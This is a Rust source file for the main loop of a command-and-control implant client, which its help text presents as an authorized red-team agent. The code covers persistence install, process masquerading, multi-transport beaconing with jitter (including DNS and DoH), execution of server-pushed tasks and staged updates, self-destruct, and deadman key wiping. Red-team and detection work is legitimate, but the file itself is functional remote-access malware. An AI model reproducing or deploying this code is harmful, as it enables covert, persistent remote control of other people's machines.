use c2v2_client::config::{Profile, TransportCfg};
use c2v2_client::crypto;
use c2v2_client::modules;
use c2v2_client::platform;
use c2v2_client::session::{self, Session};
use c2v2_client::transport::Link;
use c2v2_client::wire;
use serde_json::json;
use std::time::{Duration, Instant};

#[derive(Default)]
struct Args {
    profile: String,
    transport: String,
    once: bool,
    selftest: bool,
    install: bool,
    uninstall: bool,
    daemon: bool,
    verbose: bool,
    version: bool,
    deadman: u64,
    state_file: String,
}

fn parse_args() -> Result<Args, String> {
    let mut a = Args::default();
    let mut it = std::env::args().skip(1);
    while let Some(x) = it.next() {
        let mut take = |name: &str| -> Result<String, String> {
            it.next().ok_or_else(|| format!("{} requires a value", name))
        };
        match x.as_str() {
            "--profile" => a.profile = take("--profile")?,
            "--transport" => a.transport = take("--transport")?,
            "--once" => a.once = true,
            "--selftest" => a.selftest = true,
            "--install" => a.install = true,
            "--uninstall" => a.uninstall = true,
            "--daemon" => a.daemon = true,
            "--verbose" | "-v" => a.verbose = true,
            "--version" | "-V" => a.version = true,
            "--deadman-secs" => a.deadman = take("--deadman-secs")?.parse().unwrap_or(0),
            "--state-file" => a.state_file = take("--state-file")?,
            "--help" | "-h" => {
                print_help();
                std::process::exit(0);
            }
            other => return Err(format!("unknown argument {:?} (see --help)", other)),
        }
    }
    Ok(a)
}

fn print_help() {
    println!(
        "c2v2-client {} — authorized red-team agent\n\
         \n\
         usage: c2v2-client [--profile FILE] [--transport KIND] [--once] [--selftest]\n\
         \x20                   [--install|--uninstall] [--daemon] [--deadman-secs N] [-v]\n\
         \n\
         --profile FILE    JSON profile generated by c2builder (default: embedded)\n\
         --transport KIND  override transport (tls|tcp|ws|wss|udp|dns|doh)\n\
         --once            connect, handshake, print sid and exit\n\
         --selftest        run local module dispatch (ping/sysinfo) and exit\n\
         --install         install persistence and exit\n\
         --uninstall       remove persistence and exit\n\
         --daemon          run loop (for persistence entries)\n\
         --deadman-secs N  exit when the server is silent for N seconds (0 = off)\n",
        c2v2_client::VERSION
    );
}

fn log(args: &Args, msg: &str) {
    if args.verbose {
        eprintln!("[c2v2 {}] {}", wire::now(), msg);
    }
}

fn main() {
    let args = match parse_args() {
        Ok(a) => a,
        Err(e) => {
            eprintln!("error: {}", e);
            std::process::exit(2);
        }
    };
    if args.version {
        println!("c2v2-client {}", c2v2_client::VERSION);
        return;
    }
    let mut prof = match Profile::load(if args.profile.is_empty() { None } else { Some(&args.profile) }) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("error: {}", e);
            std::process::exit(2);
        }
    };
    if let Ok(v) = std::env::var("C2V2_CLIENT_ID") {
        if !v.is_empty() {
            prof.client_id = v;
        }
    }
    if !prof.masquerade.is_empty() {
        platform::apply_masquerade(&prof.masquerade);
    }

    if args.selftest {
        let mut out = Vec::new();
        for name in ["ping", "sysinfo", "net_info"] {
            match modules::dispatch(name, &json!({}), &prof) {
                Ok(v) => out.push(json!({"module": name, "ok": true, "data": v})),
                Err(e) => out.push(json!({"module": name, "ok": false, "err": e})),
            }
        }
        println!("{}", serde_json::to_string_pretty(&json!({"selftest": out})).unwrap_or_default());
        return;
    }

    if args.install || args.uninstall {
        let name = modules::persist_name(&prof);
        let v = if args.install {
            c2v2_client::persist::install(&name)
        } else {
            c2v2_client::persist::remove(&name)
        };
        println!("{}", serde_json::to_string_pretty(&v).unwrap_or_default());
        return;
    }

    let mut candidates: Vec<TransportCfg> = prof.transports.clone();
    if !args.transport.is_empty() {
        candidates = candidates
            .into_iter()
            .filter(|t| t.kind == args.transport)
            .collect();
        if candidates.is_empty() {
            let (host, port) = split_endpoint(&prof.transport);
            candidates.push(TransportCfg {
                kind: args.transport.clone(),
                host: if host.is_empty() { "127.0.0.1".into() } else { host },
                port: if port == 0 { 9443 } else { port },
                path: "/ws".into(),
                suffix: "c2.example.com".into(),
                tls_insecure: true,
                timeout_secs: 15,
                ..Default::default()
            });
        }
    }

    let mut failures: Vec<String> = Vec::new();
    let mut backoff = 3u64;
    loop {
        for cfg in &candidates {
            log(&args, &format!("connecting via {} to {}:{}", cfg.kind, cfg.host, cfg.port));
            let link = match Link::open(cfg) {
                Ok(l) => l,
                Err(e) => {
                    failures.push(format!("{}: {}", cfg.kind, e));
                    log(&args, &format!("open failed: {}", e));
                    continue;
                }
            };
            match session::handshake(link, &prof) {
                Ok((sess, info)) => {
                    failures.clear();
                    println!(
                        "handshake ok sid={} transport={} sleep={} jitter={} tenant={}",
                        info.sid,
                        sess.link.kind(),
                        info.sleep,
                        info.jitter,
                        info.tenant
                    );
                    if args.once {
                        write_state(&args, &prof, &info.sid, sess.link.kind());
                        return;
                    }
                    let reason = run_session(sess, &info, &prof, &args);
                    log(&args, &format!("session ended: {:?}", reason));
                    match reason {
                        Exit::Killed => return,
                        Exit::SelfDestruct => {
                            std::process::exit(0);
                        }
                        Exit::Disconnect => {
                            backoff = 3;
                        }
                    }
                }
                Err(e) => {
                    failures.push(format!("{} handshake: {}", cfg.kind, e));
                    log(&args, &format!("handshake failed: {}", e));
                }
            }
        }
        if !failures.is_empty() && args.verbose {
            eprintln!("[c2v2] last failures: {:?}", failures.last());
        }
        let jitter = if prof.jitter > 0 {
            let mut seed = [0u8; 8];
            use rand::RngCore;
            rand::rngs::OsRng.fill_bytes(&mut seed);
            let r = u64::from_le_bytes(seed) % (prof.jitter.max(1) as u64 + 1);
            backoff + r
        } else {
            backoff
        };
        std::thread::sleep(Duration::from_secs(jitter.min(300)));
        backoff = (backoff * 2).min(120);
    }
}

fn split_endpoint(s: &str) -> (String, u16) {
    let rest = s.split("://").nth(1).unwrap_or(s);
    let hostport = rest.split('/').next().unwrap_or(rest);
    match hostport.rsplit_once(':') {
        Some((h, p)) => (h.to_string(), p.parse().unwrap_or(443)),
        None => (hostport.to_string(), 443),
    }
}

fn write_state(args: &Args, prof: &Profile, sid: &str, transport: &str) {
    if args.state_file.is_empty() {
        return;
    }
    let v = json!({
        "sid": sid, "transport": transport, "client_id": prof.client_id,
        "os": platform::os_name(), "arch": platform::arch(), "ts": wire::now(),
    });
    if let Some(parent) = std::path::Path::new(&args.state_file).parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let _ = std::fs::write(&args.state_file, serde_json::to_vec_pretty(&v).unwrap_or_default());
}

#[derive(Debug)]
enum Exit {
    Killed,
    SelfDestruct,
    Disconnect,
}

fn run_session(mut sess: Session, info: &session::SessionInfo, prof: &Profile, args: &Args) -> Exit {
    let sleep = if info.sleep == 0 { prof.sleep.max(5) } else { info.sleep } as u64;
    let jitter = info.jitter as u64;
    let mut next_hb = Instant::now();
    let mut last_rx = Instant::now();
    let mut seq: u64 = 0;
    let mut pending_kill: Option<(String, i64)> = None;
    let deadman = if args.deadman > 0 { args.deadman } else { prof.deadman_secs as u64 };
    let poll = Duration::from_millis(if sess.link.is_datagram() { 1000 } else { 1500 });

    loop {
        let now = Instant::now();
        if now >= next_hb {
            seq += 1;
            let hb = json!({"t": "hb", "ts": wire::now(), "seq": seq});
            if let Err(e) = sess.send_value(&hb) {
                log(args, &format!("hb failed: {}", e));
                return Exit::Disconnect;
            }
            let wait = sleep.saturating_sub(jitter / 2).max(5);
            let extra = if jitter > 0 {
                let mut b = [0u8; 8];
                use rand::RngCore;
                rand::rngs::OsRng.fill_bytes(&mut b);
                u64::from_le_bytes(b) % (jitter + 1)
            } else {
                0
            };
            next_hb = Instant::now() + Duration::from_secs(wait + extra);
        }
        if deadman > 0 && last_rx.elapsed() > Duration::from_secs(deadman) {
            match prof.deadman_action.as_str() {
                "wipe" => {
                    sess.keys.zeroize();
                    c2v2_client::persist::remove(&modules::persist_name(prof));
                }
                _ => {}
            }
            return Exit::Killed;
        }        let msg = match sess.recv_value(poll) {
            Ok(Some(v)) => v,
            Ok(None) => continue,
            Err(e) => {
                log(args, &format!("recv failed: {}", e));
                return Exit::Disconnect;
            }
        };
        last_rx = Instant::now();
        let t = wire::message_type(&msg).to_string();
        match t.as_str() {
            "hb_ack" => {}
            "task" => {
                let id = msg.get("id").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let name = msg.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let targs = msg.get("args").cloned().unwrap_or(json!({}));
                let started = Instant::now();
                log(args, &format!("task {} {}", id, name));
                let res = match modules::dispatch(&name, &targs, prof) {
                    Ok(v) => json!({
                        "t": "result", "id": id, "ok": true, "data": v,
                        "elapsed_ms": started.elapsed().as_millis() as u64,
                    }),
                    Err(e) => json!({
                        "t": "result", "id": id, "ok": false, "err": e,
                        "elapsed_ms": started.elapsed().as_millis() as u64,
                    }),
                };
                if let Err(e) = sess.send_value(&res) {
                    log(args, &format!("send result failed: {}", e));
                    return Exit::Disconnect;
                }
                if name == "selfdestruct" && res.get("ok").and_then(|v| v.as_bool()).unwrap_or(false) {
                    return Exit::SelfDestruct;
                }
            }
            "kill_prepare" => {
                let nonce = msg.get("nonce").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let exp = msg.get("expires").and_then(|v| v.as_i64()).unwrap_or(0);
                pending_kill = Some((nonce, exp));
            }
            "kill" => {
                let nonce = msg.get("nonce").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let exp = msg.get("expires").and_then(|v| v.as_i64()).unwrap_or(0);
                let wipe = msg.get("wipe_keys").and_then(|v| v.as_bool()).unwrap_or(false);
                let uninstall = msg.get("uninstall").and_then(|v| v.as_bool()).unwrap_or(false);
                let sig = msg.get("sig").and_then(|v| v.as_str()).unwrap_or("");
                let key = wire::unb64(&prof.kill_key_b64).unwrap_or_default();
                let mut ok = !key.is_empty() && wire::now() <= exp;
                let mut note = String::new();
                match &pending_kill {
                    Some((pn, pe)) if *pn == nonce && *pe == exp => {}
                    Some(_) => {
                        ok = false;
                        note = "prepare nonce mismatch".into();
                    }
                    None => {
                        ok = false;
                        note = "no kill_prepare received".into();
                    }
                }
                if ok {
                    let parts = [
                        info.sid.as_str(),
                        nonce.as_str(),
                        &exp.to_string(),
                        if wipe { "true" } else { "false" },
                        if uninstall { "true" } else { "false" },
                    ];
                    ok = crypto::verify_hmac(&key, sig, &parts);
                    if !ok {
                        note = "signature mismatch".into();
                    }
                }
                let ack = json!({"t": "kill_ack", "nonce": nonce, "ok": ok, "note": note});
                let _ = sess.send_value(&ack);
                if ok {
                    if wipe {
                        sess.keys.zeroize();
                    }
                    if uninstall {
                        let _ = c2v2_client::persist::remove(&modules::persist_name(prof));
                    }
                    let _ = std::fs::remove_file(c2v2_client::config::state_dir().join("client.json"));
                    return Exit::Killed;
                }
            }
            "update" => {
                let manifest = msg.get("manifest").cloned().unwrap_or(json!({}));
                let mut margs = manifest.clone();
                if let Some(o) = margs.as_object_mut() {
                    o.insert("sig".into(), msg.get("sig").cloned().unwrap_or(json!("")));
                }
                let dry = msg.get("dry_run").and_then(|v| v.as_bool()).unwrap_or(false);
                let res = if dry {
                    Ok(json!({"dry_run": true, "manifest": manifest}))
                } else {
                    modules::dispatch("update_stage", &margs, prof)
                };
                let out = match res {
                    Ok(v) => json!({"t": "update_result", "ok": true, "data": v}),
                    Err(e) => json!({"t": "update_result", "ok": false, "err": e}),
                };
                let _ = sess.send_value(&out);
            }
            "error" => {
                log(args, &format!("server error: {}", msg.get("msg").and_then(|v| v.as_str()).unwrap_or("")));
            }
            other => {
                log(args, &format!("ignoring message type {:?}", other));
            }
        }
    }
}
